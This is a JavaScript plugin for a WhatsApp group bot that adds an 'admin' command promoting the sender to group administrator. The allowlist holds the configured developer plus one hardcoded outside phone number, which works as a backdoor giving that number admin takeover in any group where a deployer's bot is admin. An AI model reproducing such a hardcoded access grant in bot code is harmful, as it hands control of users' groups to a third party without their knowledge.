const { cmd } = require('../command');
const config = require('../config');

cmd({
    pattern: "admin",
    alias: ["takeadmin", "makeadmin"],
    desc: "Devenir admin pour les utilisateurs autorisés",
    category: "owner",
    react: "👑",
    filename: __filename
},
async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {

    if (!isGroup)
        return reply("❌ Cette commande ne peut être utilisée que dans un groupe.");

    if (!isBotAdmins)
        return reply("❌ Je dois être administrateur pour effectuer cette action.");

    // Fonction pour normaliser les JID
    const normalizeJid = (jid) => {
        if (!jid) return jid;
        return jid.includes('@') ? jid : jid + '@s.whatsapp.net';
    };

    const UTILISATEURS_AUTORISÉS = [
        normalizeJid(config.DEV),
        "22603582906@s.whatsapp.net"
    ].filter(Boolean);

    const senderNormalized = normalizeJid(sender);

    if (!UTILISATEURS_AUTORISÉS.includes(senderNormalized)) {
        return reply("❌ Seuls les utilisateurs autorisés peuvent utiliser cette commande.");
    }

    try {
        const groupMetadata = await conn.groupMetadata(from);
        const moi = groupMetadata.participants.find(p => p.id === senderNormalized);

        if (moi?.admin) {
            return reply("ℹ️ Tu es déjà administrateur de ce groupe.");
        }

        await conn.groupParticipantsUpdate(from, [senderNormalized], "promote");

        return reply("✅ Tu es maintenant administrateur du groupe !");
    } catch (error) {
        console.error("Erreur dans la commande .admin :", error);
        return reply("❌ Impossible de te donner les droits admin.\nErreur : " + error.message);
    }
});
